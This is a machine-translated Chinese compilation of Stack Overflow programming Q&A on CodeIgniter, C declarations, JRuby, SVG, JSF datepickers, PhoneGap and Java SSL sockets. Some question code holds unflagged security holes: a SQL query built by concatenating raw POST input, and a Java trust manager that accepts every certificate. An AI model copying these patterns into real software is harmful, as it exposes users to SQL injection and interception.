                        'style' => 'width:40%');
                echo form_input($gol1,$row->golongan);?>
            <?php echo form_error('gol');?>
        </td>
        <td width="10%" align="left">Tarif</td>
        <td width="44%">
            <?php 
                $tarif = array(
                'name' => 'tarif',
                'maxlength' => '100',
                'size' => '50',
                'style' => 'width:30%');
                echo form_input($tarif,$row->tarif);?>
            <?php echo form_error('tarif');?>
        </td>
    </tr>
</table> 
```

这是我的代码控制器

```
public function cari_id()
{
    $this->auth->restrict();
   // mencegah user mengakses menu yang tidak boleh ia buka
    $this->auth->cek_menu(4);

    $this->load->library('form_validation');

    $this->form_validation->set_rules('id', 'ID Pelanggan', 'trim|required');
    //$this->form_validation->set_rules('nama','Nama','trim'|'required');
    //$this->form_validation->set_rules('alamat','Alamat','trim'|'required');
    //$this->form_validation->set_rules('gol', 'Golongan', 'trim|required');
    //$this->form_validation->set_rules('tarif', 'Tarif', 'trim|required');
    $this->form_validation->set_error_delimiters(' <span style="color:#FF0000">', '</span>');
    $id_pel = $this->input->post('id') ;
    //$data1 = $this->usermodel->get_list_bayar_pel($id_pel);
    //$data=$data1->row();
    $data1 = $this->usermodel->get_list_bayar_pel($id_pel);
    $data['record'] = $query->result_array();
    $this->template->set('title','Input Pembayaran | POS Application');
    $this->template->load('template','admin/input_pembayaran',$data);

} 
```

和型号代码

```
function get_list_bayar_pel($id)
{
    $this->db->select('b.name as nama, b.address as alamat, c.nm_gol as golongan,d.rate_value as tarif');
    $this->db->from('account_t a, account_nameinfo_t b, golongan_t c, (select rate_value from rate_t a, golongan_t b where a.id_gol = b.id_gol) d');    
    $this->db->where('a.id_account = b.obj_id');
    $this->db->where('a.id_gol = c.id_gol');
    $this->db->where('a.id_account = "'.$id.'"');
    $result = $this->db->get();
    return $result;
    } 
```

谢谢之前

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:00:44.380

在您的控制器中，您正在获取多行

```
$data['record'] = $query->result_array(); 
```

它应该是

```
$data['record'] = $query->row(); 
```

并在视图中给出 $row = $record; 而不是 $row = $record->row();

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:22:03.907

根据您的代码，您使用 row() 函数在视图中检索数据，同时它已使用以下方法在控制器中获取：

```
 $data['record'] = $query->result_array(); 
```

只需使用其中之一（在控制器中）：

```
$data['record'] = $query->result_array(); 
```

或者

```
$data['record'] = $query->row(); 
```

然后处理视图中的数组

希望能帮助到你 ：）

注意：
-我建议您使用 result_array() 将数据检索到数组中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:51:40.313

在你的控制器中写这个

```
$data['record'] = $query->row(); 
```

并在视图中删除 php 代码写入

```
 <?php   

                $nama1 = array(
                         'name' => 'nama',
                         'maxlength' => '100',
                         'size' => '50',
                         'style' => 'width:120%');
                echo form_input($nama1,$record->nama);?>
            <?php echo form_error('nama');?> 
```

在模型中

```
$result = $this->db->get('tablename')->row(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T08:53:07.880

$record 没有返回单行，它返回一个集合，要么使用 current($record)->row() 要么获取单行。

# c - 声明是表达式吗？

> ID：11736290
> 
> 赞同：1
> 
> 时间：2012-07-31T08:44:23.140
> 
> 标签：c, expression, declaration

我想知道，在下面的声明中，`p`是否是一个左值，即`p`这个声明中的表达式？（如果答案是“是”，它是一个左值，因为`p`用 value 改变了位于的对象`&p`的值`&n`）。

```
unsigned char *p = &n; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:50:16.337

C 说（强调我的）用于初始化标量：

> （C99，6.7.8p11）“对象的初始值是表达式的初始值（转换后）；**与简单赋值相同的类型约束和转换适用**，将标量的类型作为其声明的非限定版本类型。”

并且赋值运算符的约束表明左操作数必须是（可修改的）左值。

对于术语，声明既不是表达式也不是语句，但初始化程序可以是表达式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:54:04.413

从Stroustrups C++书的语法部分来看，声明语句不是表达式语句。我想这也适用于经典 C。因此，虽然您的初始化程序是一个表达式，但您的声明作为一个整体不是一个表达式。带等号的东西也不是严格意义上的赋值；相反，它是一个初始化，略有不同。出于同样的原因，`p`即使赋值和初始化共享许多通用规则，它也不是真正的表达式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:55:00.243

简短回答您的问题：不，声明不是表达式。声明可能包含用于确定类型的表达式，但仅此而已，初始化表达式也是一个表达式。

看来您关于左值的问题毫无意义。由于它不是表达式，因此它没有值。

# aptana3 - 编组流中的无效编码：I"◄co OR [I"co]

> ID：11736297
> 
> 赞同：10
> 
> 时间：2012-07-31T08:44:32.957
> 
> 标签：aptana3, jrubyonrails

我在 Aptana 框架上的 Jruby 中编码时遇到问题；当我运行 rails 服务器时，它会抛出“编组流中的无效编码”，我不知道如何解决？

它会在“<%=stylesheet_link_tag%> 和 <%=javascript_include_tag%>”上抛出错误，这里我给出一段代码，请帮助解决这个问题：

```
<title><%=content_for?(:title)?yield(:title) : "MyApp"%></title>

 <meta name="description" content="">

 <meta name="author" content="">

 <%=stylesheet_link_tag "application", :media => "all"%>

 <%=javascript_include_tag "application"%>

  <%=csrf_meta_tags%>

  <%=yield(:head)%> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-08T18:33:34.777

尝试`rake tmp:clear`在 MRI 文件上运行它窒息 - 这是这个问题的副本 [Windows - JRuby on Rails - ActionView::Template::Error invalid encoding](https://stackoverflow.com/questions/12851746/windows-jruby-on-rails-actionviewtemplateerror-invalid-encoding)

# javascript - 移动设备上 javascript 的 SVG 缩放性能问题

> ID：11736299
> 
> 赞同：1
> 
> 时间：2012-07-31T08:44:39.633
> 
> 标签：javascript, svg

我目前正在尝试在 svg 格式的 pdf 页面上实现缩放。

我正在修改视图框以允许缩放。虽然这在桌面上运行良好，但我在 iPad 上遇到了巨大的性能问题。

有谁知道如何通过修改视图框来实现这一点？

此致

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T11:57:40.000

外部`<svg>`元素具有[currentScale 和 currentTranslate](http://www.w3.org/TR/SVG/struct.html#InterfaceSVGSVGElement)属性，旨在允许实现缩放/平移。

# javascript - Datepicker 在 AJAX JSF 页面中不起作用

> ID：11736300
> 
> 赞同：0
> 
> 时间：2012-07-31T08:44:47.607
> 
> 标签：javascript, css, jsf, jsf-2, primefaces

我有一个带有 Datepicker 的 JSF 页面。问题是当我使用 AJAX 将数据更新到页面中时。在我执行 AJAX 操作后，页面是 datepicker 不起作用：

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"    
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:ui="http://java.sun.com/jsf/facelets"
      xmlns:p="http://primefaces.org/ui">
    <h:head>
        <ui:insert name="header">           
            <ui:include src="header.xhtml"/>         
        </ui:insert>       
    </h:head>
    <h:body>
        <h1><img src="resources/css/images/icon.png" alt="DX-57" /> Account Center</h1>
        <!-- layer for black background of the buttons -->
        <div id="toolbar" style="margin: 0 auto; width:100%; height:30px; position:relative;  background-color:black">
            <!-- Include page Navigation -->
            <ui:insert name="Navigation">           
                <ui:include src="Navigation.xhtml"/>         
            </ui:insert>
        </div>  
        <div id="logodiv" style="position:relative; top:35px; left:0px;"> 
            <h:graphicImage alt="Account Profile"  style="position:relative"  value="resources/images/logo_account_profile.png" />
        </div>
        <div id="main" style="margin: 0 auto; width:1190px; height:700px; position:absolute;  background-color:transparent; top:105px">

            <div id="mainpage" style="margin: 0 auto; width:1190px; height:500px; position:absolute;  background-color:transparent; top:80px">

                <div id="settingsdiva" style="width:850px; height:500px; position:absolute;  background-color:transparent; top:20px; left:20px">

                    <h:form id="form">
                        <table>
                            <ui:repeat var="ud" value="#{AccountProfileController.userData}">
                                <tr>
                                    <td>User ID</td>
                                    <td>
                                        <h:outputText value="#{ud.userid}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.userid}" rendered="#{AccountProfileController.editable}" />
                                    </td>
                                </tr>
                                <tr>
                                    <td>Group ID</td>
                                    <td>
                                        <h:outputText value="#{ud.groupid}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText id="groupid" value="#{ud.groupid}" rendered="#{AccountProfileController.editable}"
                                                     validator="#{ValidatorController.validateEditGroupID}" autocomplete="off">                                        
                                            <f:ajax event="blur" render="groupidvalidator" />                                          
                                        </h:inputText>
                                        <h:message id="groupidvalidator" for="groupid" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Special Number</td>
                                    <td>
                                        <h:outputText value="#{ud.specialnumber}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.specialnumber}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Username</td>
                                    <td>
                                        <h:outputText value="#{ud.username}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.username}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Password</td>
                                    <td>
                                        <h:outputText value="Encrypted" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.passwd}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Date to change password</td>
                                    <td>
                                        <h:outputText value="#{ud.datetochangepasswd}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText styleClass="datepicker" value="#{ud.datetochangepasswd}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Address</td>
                                    <td>
                                        <h:outputText value="#{ud.address}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.address}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>State/Region</td>
                                    <td>
                                        <h:outputText value="#{ud.stateregion}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.stateregion}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Country</td>
                                    <td>
                                        <h:outputText value="#{ud.country}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.country}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>User Status</td>
                                    <td>
                                        <h:outputText value="#{ud.userstatus}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.userstatus}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Telephone</td>
                                    <td>
                                        <h:outputText value="#{ud.telephone}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.telephone}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Date User Added</td>
                                    <td>
                                        <h:outputText value="#{ud.dateuseradded}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText styleClass="datepicker" value="#{ud.dateuseradded}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>User Expire Date</td>
                                    <td>
                                        <h:outputText value="#{ud.userexpiredate}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText styleClass="datepicker" value="#{ud.userexpiredate}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Date User Locked</td>
                                    <td>
                                        <h:outputText value="#{ud.dateuserlocked}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText id="datetouserlocked" styleClass="datepicker" value="#{ud.dateuserlocked}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>City</td>
                                    <td>
                                        <h:outputText value="#{ud.city}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.city}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>E-mail</td>
                                    <td>
                                        <h:outputText value="#{ud.email}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.email}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>
                                <tr>
                                    <td>Description</td>
                                    <td>
                                        <h:outputText value="#{ud.description}" 
                                                      rendered="#{not AccountProfileController.editable}" />
                                        <h:inputText value="#{ud.description}" rendered="#{AccountProfileController.editable}" />
                                    </td>                                    
                                </tr>

                            </ui:repeat>
                        </table>
                        <!-- Insert this in order to use JGrown message-->                           
                        <p:growl id="growl" showDetail="true" sticky="true" />
                        <h:commandButton value=" Edit Account " rendered="#{not AccountProfileController.editable}" action="#{AccountProfileController.editAccount(true)}" >
                            <f:ajax render="@form" execute="@form"></f:ajax>
                        </h:commandButton>&nbsp;                        
                        <h:commandButton value=" Save Account " rendered="#{AccountProfileController.editable}" action="#{AccountProfileController.saveData}" update="growl">
                            <f:ajax render="@form" execute="@form"></f:ajax>
                        </h:commandButton>&nbsp;
                        <h:commandButton value=" Cancel " rendered="#{AccountProfileController.editable}" action="#{AccountProfileController.initDBData}" >
                            <f:ajax render="@form"></f:ajax>
                        </h:commandButton>

                        <script type="text/javascript">
                            //For calendar
                            $(".datepicker").datepicker({
                                inline: true,
                                showWeek: true,
                                firstDay: 1,
                                dateFormat: 'dd-MM-yy'
                            });                            
                        </script>
                        <script type="text/javascript" src="resources/js/tabs.js"></script> 

                    </h:form>

                </div>   

                <div id="settingsdivb" style="width:450px; height:500px; position:absolute;  background-color:transparent; top:20px; left:600px">

                </div>               

            </div>  
        </div>

    </h:body>
</html> 
```

我测试了删除 AJAX 部分 - 日期选择器工作正常。你能告诉我为什么 AJAX 会阻止 JavaScript 工作吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T09:23:52.057

添加这个（不要替换您当前的代码）

```
$(window).load(function () {
 jsf.ajax.addOnEvent(function(data) {
  if (data.status === 'success') {
       $(".datepicker").datepicker({
            inline: true,
            showWeek: true,
            firstDay: 1,
             dateFormat: 'dd-MM-yy'
        });     
        }
 });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T09:41:08.927

是的，AJAX 更新后 Datepicker 可能无法工作。

这些链接可能会有所帮助。

[jQuery Datepicker 在 Ajax Partial Postback 之后不起作用](http://jquerybyexample.blogspot.com/2010/08/jquery-datepicker-does-not-work-after.html)。

[jQuery 日期选择器在 AJAX 之后不持久](https://stackoverflow.com/questions/2801986/jquery-date-picker-not-persistant-after-ajax)

[Ajax 调用后的日期选择器不太工作 - 意外行为？](http://forum.jquery.com/topic/datepicker-after-ajax-call-not-quite-working-unexpected-behavior)

# android - PhonegapBuild 简单文件下载

> ID：11736301
> 
> 赞同：0
> 
> 时间：2012-07-31T08:44:48.370
> 
> 标签：android, ios, cordova, download

我构建了在 Android 上运行良好的纯 html PhoneGap 应用程序。它具有下载大型视频文件的链接。简单的直接链接。但是它不能在 iPhone 或 iOS 上下载。他们的浏览器不支持文件下载。它尝试播放和口吃，然后停止。

我需要非常简单的函数或代码来在 iOS 上下载文件。

我没有 phonegap js 或任何 js，但如果需要我可以包括。仅使用了 html 和 config.xml。我使用 PhoneGap Build 从 html/css 创建应用程序。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:14:44.393

要下载文件（来自[phonegap doc](http://docs.phonegap.com/en/2.0.0/cordova_file_file.md.html#FileTransfer)的片段）：

```
var fileTransfer = new FileTransfer();
var uri = encodeURI("http://some.server.com/download.php");

fileTransfer.download(
    uri,
    filePath,
    function(entry) {
        console.log("download complete: " + entry.fullPath);
    },
    function(error) {
        console.log("download error source " + error.source);
        console.log("download error target " + error.target);
        console.log("upload error code" + error.code);
    }
); 
```

第一个参数是你要下载的url，最后两个是成功和错误回调。第二个是您要存储文件的完整路径，包括文件名和扩展名。要获取对您的应用程序根目录的引用：

```
function gotFS(fileSystem) {
    console.log("got filesystem");
    // save the file system for later access
    console.log(fileSystem.root.fullPath);
    window.rootFS = fileSystem.root;
}

document.addEventListener('deviceready', function() {
    window.requestFileSystem  = window.requestFileSystem || window.webkitRequestFileSystem;
    window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);
}, false); 
```

因此，如果您正在下载一个名为“video.avi”的视频并希望将其存储在应用程序根文件夹中，那么您将传递给下载方法的 filePath 变量将是这样的：

```
var filePath = rootFS.fullPath+'/video.avi'; 
```

希望这可以帮助

# java - 尽管我明确设置了一个不验证任何证书的信任管理器，但为什么 Java 会尝试验证证书路径？

> ID：11736304
> 
> 赞同：1
> 
> 时间：2012-07-31T08:45:02.547
> 
> 标签：java, sockets, ssl, sslhandshakeexception, pkix

我有一个关于使用套接字和 Java 7 通过 SSL 进行简单通信的问题。

到目前为止，我已经创建了两个*Runnable——*一个用于服务器，一个用于客户端。最后，我想创建一个简单的测试，其中我的应用程序使用 SSL 将数据发送到模型服务器。服务器要做的就是接收客户端发送的字符串，将其与文件的内容进行比较，然后根据比较是否成功返回响应字符串。

但是，我被困在*javax.net.ssl.SSLHandshakeException*上，尽管我明确*不*希望客户端通过身份验证！在客户端，我创建了一个不验证任何证书的信任管理器。在服务器端，设置*this.sslServerSocket.setWantClientAuth(false)*和/或*this.sslServerSocket.setNeedClientAuth(false)*也无济于事。出于测试目的，客户端和服务器都使用名为“keystore.ks”的相同密钥文件。

我用下面的箭头 (----->) 标记了异常发生的点。也许有人可以给我一个提示那里有什么问题！

* * *

这是我的 SSLServer 类：

```
public class SSLServer implements Runnable
{    
    private SSLServerSocketFactory sslServerSocketFactory;
    private SSLServerSocket sslServerSocket;
    private SSLSocket sslSocket;
    private KeyStore keystore;
    private KeyManager[] keyManagers;
    private SSLContext sslContext;
    private SSLSession sslSession;
    private int port = 8081;
    private static final Character EOL = '\n';
    private static final Character EOF = '\u0017';

    public SSLServer() throws IOException, NoSuchAlgorithmException, KeyManagementException, KeyStoreException, CertificateException, UnrecoverableKeyException
    {
        char[] passphrase = "changeit".toCharArray();
        this.keystore = KeyStore.getInstance(KeyStore.getDefaultType());
        this.keystore.load(new FileInputStream("keystore.ks"), passphrase);

        KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance("SunX509");
        keyManagerFactory.init(this.keystore, passphrase);

        this.sslContext = SSLContext.getInstance("TLS");

        this.keyManagers = keyManagerFactory.getKeyManagers();

        this.sslContext.init(this.keyManagers, null, null);

        this.sslServerSocketFactory = this.sslContext.getServerSocketFactory();
        this.sslServerSocket = (SSLServerSocket) this.sslServerSocketFactory.createServerSocket(this.port);
        this.sslServerSocket.setSoTimeout(30000);
        this.sslServerSocket.setEnabledProtocols(new String [] { "TLSv1", "TLSv1.1", "TLSv1.2" });
        this.sslServerSocket.setUseClientMode(false);
        this.sslServerSocket.setWantClientAuth(false);
        this.sslServerSocket.setNeedClientAuth(false);
    }

    @Override
    public void run()
    {
        InputStream inputStream = null;
        InputStreamReader inputStreamReader = null;
        BufferedReader input = null;
        OutputStream outputStream = null;
        PrintWriter output = null;

        try
        {
            System.out.println("Server started");

            System.out.println("  Waiting for connection from client...");
            this.sslSocket = (SSLSocket) this.sslServerSocket.accept();

            // Connection was accepted
            System.out.println("  Accepted connection from " + this.sslSocket.getInetAddress().getHostAddress() + ", port " + this.sslSocket.getPort());

            // set up a SSL session
            this.sslSession = this.sslSocket.getSession();
            System.out.println("  Cipher suite used for this session: " + this.sslSession.getCipherSuite());

            inputStream = (InputStream) this.sslSocket.getInputStream();
            inputStreamReader = new InputStreamReader(inputStream);
            input = new BufferedReader(inputStreamReader);

            outputStream = this.sslSocket.getOutputStream();
            output = new PrintWriter(outputStream);

            System.out.println("  Server -> receiving...");
            StringBuffer receiver = new StringBuffer();
            Character serverReceived;
            while ((serverReceived = (char)input.read()) != EOF)
            {
                receiver.append(serverReceived);
            }
            System.out.println("    Server received: " + serverReceived);

            System.out.println("  Server -> sending...");

            String serverSendSuccess = "Hello client, how are you?" + EOL + EOF;
            String serverSendFail = "Who are you?" + EOL + EOF;

            if (receiver.toString().contains("Hello server! I am the client!"))
            {
                System.out.println("    Server sent: " + serverSendSuccess);
                output.println(serverSendSuccess);
                output.flush();
            }
            else
            {
                System.out.println("    Server sent: " + serverSendFail);
                output.println(serverSendFail);
                output.flush();
            }
        }
        catch (IOException ex)
        {
            ex.printStackTrace();
        }
        finally
        {
            try
            {
                inputStream.close();
                outputStream.close();
                this.sslSocket.close();
            }
            catch(Exception ex) {}
            System.out.println("Server ended");
        }
    }
} 
```

这是我的客户类：

```
public class SSLClient implements Runnable
{
    private SSLSocketFactory sslSocketFactory;
    private SSLSocket sslSocket;
    private KeyStore keystore;
    private KeyManager[] keyManagers;
    private TrustManager[] trustManagers;
    private SSLContext sslContext;
    private String hostname = "localhost";
    private int port = 8081;
    private static final Character EOL = '\n';
    private static final Character EOF = '\u0017';

    public SSLClient() throws UnknownHostException, IOException, KeyStoreException, NoSuchAlgorithmException, KeyManagementException, CertificateException, NoSuchProviderException, UnrecoverableKeyException
    {
        char[] passphrase = "changeit".toCharArray();        
        this.keystore = KeyStore.getInstance(KeyStore.getDefaultType());
        this.keystore.load(new FileInputStream("keystore.ks"), passphrase);

        KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance("SunX509");
        keyManagerFactory.init(this.keystore, passphrase);

        this.sslContext = SSLContext.getInstance("TLS");

        this.keyManagers = keyManagerFactory.getKeyManagers();

        this.trustManagers = new TrustManager[]{
            new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers()
                {
                    return null;
                }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType)
                {

                }
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType)
                {

                }
            }
        };

        this.sslContext.init(this.keyManagers, this.trustManagers, new SecureRandom());

        this.sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
    }

    @Override
    public void run()
    {
        InputStream inputStream = null;
        InputStreamReader inputStreamReader = null;
        BufferedReader input = null;
        OutputStream outputStream = null;
        PrintWriter output = null;

        try
        {
            System.out.println("Start client");

            this.sslSocket = (SSLSocket) this.sslSocketFactory.createSocket(this.hostname, this.port);

            if(this.sslSocket.isConnected())
            {
                inputStream = (InputStream) this.sslSocket.getInputStream();
                inputStreamReader = new InputStreamReader(inputStream);
                input = new BufferedReader(inputStreamReader);

                outputStream = this.sslSocket.getOutputStream();                
                output = new PrintWriter(outputStream);

                System.out.println("  Client -> sending...");

                String clientSend = "Hello server! I am the client!" + EOL + EOF;

                output.println(clientSend);
----->          output.flush(); // exception occurs here!

                System.out.println("    Client sent: " + clientSend);

                StringBuffer receiver = new StringBuffer();
                Character clientReceived;
                while ((clientReceived = (char)input.read()) != EOF)
                {
                    receiver.append(clientReceived);
                }

                System.out.println("    Client received: " + receiver.toString());
            }
            else
            {
                System.err.println("Connection to server lost!");
            }
        }
        catch (IOException ex)
        {
            ex.printStackTrace();
        }
        finally
        {
            try
            {
                inputStream.close();
                outputStream.close();
                this.sslSocket.close();
            }
            catch(Exception ex) {}
            System.out.println("End client");
        }
    }
} 
```

最后，输出：

```
---Start test---
>> Start server thread
>> Start client thread
Start client
Server started
  Waiting for connection from client...
  Accepted connection from 127.0.0.1, port 55287
  Client -> sending...
    Client sent: Hello server! I am the client!
  Cipher suite used for this session: SSL_NULL_WITH_NULL_NULL
  Server -> receiving...
javax.net.ssl.SSLException: Connection has been shutdown: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
    at sun.security.ssl.SSLSocketImpl.checkEOF(SSLSocketImpl.java:1458)
    [...]
Caused by: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
    at sun.security.ssl.Alerts.getSSLException(Alerts.java:192)
    [...]
Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
    at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:385)
    [...]
Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
    at sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:196)
    [...]
Server ended
End client
---End test--- 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:50:03.150

从您精心构建的 SSLContext 中获取 SSLSocketFactory，而不是默认上下文。

在你做的地方调用 isConnected() 是徒劳的。在这一点上它不可能是假的。如果存在连接问题，则会引发异常。

# c++ - 将变量传递给函数时，为什么函数只获取变量的副本？

> ID：11736306
> 
> 赞同：13
> 
> 时间：2012-07-31T08:45:09.020
> 
> 标签：c++, c

将变量传递给函数时，为什么函数只获取变量的副本/副本？

```
int n=1;

void foo(int i)
{
    i++;
} 
```

众所周知，函数 foo() 不能通过`n`使用 foo(n) 来改变 的值。

当然我们可以通过变量的地址来对参数变量做一些改变。
但是你不觉得这有点不方便吗？

为什么 c/c++ 设计为只给函数一个副本，而不是直接给函数“真实”变量本身？
这种范式的优点/好处是什么？

* * *

**更新：**
我已经阅读了@paxdiablo 的回答。我觉得他对“效果的封装、模块化和本地化”的解释很好。
但以我的方式，它也可以保留参数参数的值。也可以实现封装。通过这种方式：（假设函数可以直接获取“真实”变量而不是默认情况下的重复）

```
void foo(int n)
{
    int temp=n;
    //Do something to temp...

} 
```

而在我看来，当您确实想更改传入参数的值时， **可以消除复杂的机制，例如“通过引用传递”或指针。这就是好处。**

经过一段时间的思考。我意识到 c/c++ 没有按照我的建议设计的原因仅仅是因为我的方式不方便！
以我的方式，如果一个函数有很长的变量列表，那就太糟糕了。我认为更方便的方法实际上是不方便的：
你必须这样写：

```
void foo(int a,int b,double c,float d,char s...)
{
    int temp1=a;
    int temp2=b;
    double temp3=c;
    float temp4=d;
    char temp5=s;
    ...
    //Do something to temp{1,2,3,4,5....}

} 
```

所以 c/c++ 的设计者引入了复杂的机制来权衡便利。
我对吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-31T08:53:12.073

在这个问题上基本上是两种思想流派。

第一种是按值传递，其中为被调用函数创建值的*副本。*

第二种是按引用传递，其中出现在被调用函数中的参数是原始的“别名”。这意味着您对其所做的更改会反映在原始文件中。

C 通常是一种按值传递的语言。*您可以通过传递变量的地址*然后使用它来修改原始地址来模拟传递引用：

```
void setTo42 (int *x) { *x = 42; }
:
int y;
setTo42 (&y);
// y is now 42 
```

但这更多的是通过值传递指向变量的指针，而不是通过引用传递变量本身。

C++ 有真正的引用类型，可能是因为很多人对 C 指针有问题 :-) 他们的做法如下：

```
void setTo42 (int &x) { x = 42; }

:
int y;
setTo42 (y);
// y is now 42 
```

值传递通常更可取，因为它限制了函数对“外部世界”的影响——封装、模块化和本地化通常是一件好事。

在模块化和代码管理方面，能够任意修改传入的任何参数几乎与全局变量一样糟糕。

但是，有时您需要通过引用传递，因为更改传入的变量之一可能是有意义的。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-31T08:51:02.450

大多数现代语言都被定义为使用按值传递。原因很简单：如果你知道一个函数不能改变你的本地状态，它会大大简化对代码的推理。如果您*希望*函数能够修改本地状态，则始终可以通过非常量引用传递，但这种情况应该非常罕见。

编辑以回应更新的问题：

不，你不对。传值是最简单的参数传递机制。通过引用传递或复制输入/复制输出更复杂（当然，Algol 的表达式替换是最复杂的）。

想一想。考虑`f(10)`。使用按值调用，编译器只是`10`压栈，而函数只是在原地访问值。通过引用调用，编译器必须创建一个临时对象，用 初始化它`10`，然后将指向它的指针传递给函数。在函数内部，编译器每次访问该值时都必须生成一个间接寻址。

此外，防止函数内部的修改并不能真正提高可读性。如果函数不接受引用参数，您无需查看函数内部就知道它无法修改您作为参数传递的任何变量。无论将来有人如何修改该功能。（甚至可以争辩说不应该允许函数修改全局状态。这会使实现`rand()`相当困难。但肯定会帮助优化器。）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-31T08:45:54.903

因为 C 按值传递参数。

来自 Kernighan & Richtie 第 2 版：（1.8 按值调用）“在 C 中，所有函数参数都由“值”传递”

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T08:49:42.860

如果你真的想让一个函数改变它的实际参数，你可以在 C++ 中通过引用传递它

```
void foo(int& i)
{
    i++;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T08:49:57.413

这是为了确保函数不会改变原始值。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-31T08:49:58.320

我想一个原因是效率，直接访问值比通过指针更有效。另一个优点是选择，您可以选择通过值或指针传递参数的 C/C++ 方式，您只能选择通过指针传递参数。但最重要的是，按值传递意味着您的函数与其余代码隔离，并且对函数内部变量的更改不会影响其余代码。相信我，如果不是这种情况，您会遇到更多错误，并且编码会更加困难。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-31T08:51:46.570

为了更改参数的值，您需要使用“&”符号通过引用传递。

这样做的原因是您可以选择是否希望更改与您的变量保持一致。如果您按值传递，您可以确定它不会改变并导致程序出错。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-07-31T09:34:01.590

